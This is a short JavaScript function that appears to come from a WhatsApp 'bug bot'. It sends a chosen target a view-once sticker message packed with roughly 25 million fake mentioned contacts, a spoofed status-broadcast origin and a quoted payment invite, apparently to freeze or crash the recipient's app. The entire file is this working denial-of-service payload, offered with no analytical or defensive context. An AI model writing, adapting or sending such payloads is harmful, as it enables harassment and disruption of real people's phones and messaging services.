async function delayBlonde(target, ptcp) {
  let msg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "./StickerBug.png"
        }, 
        contextInfo: {
          isForwarded: true, 
          forwardingScore: 250208,
          participant: "13135550001@s.whatsapp.net", 
          remoteJid: "status@broadcast", 
          mentionJid: [target, "13135550002@s.whatsapp.net", ...Array.from({ length:25022008 }, () => `2502${Math.floor(Math.random() * 250208)}2008@s.whatsapp.net`)], 
          isGroupMention: true, 
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 2,
              expiryTimestamp: Date.now()
            }
          }
        }
      }
    }
  };
  
  await Yuukey.relayMessage(target, msg, ptcp ? { participant: { jid:target }} : {});
}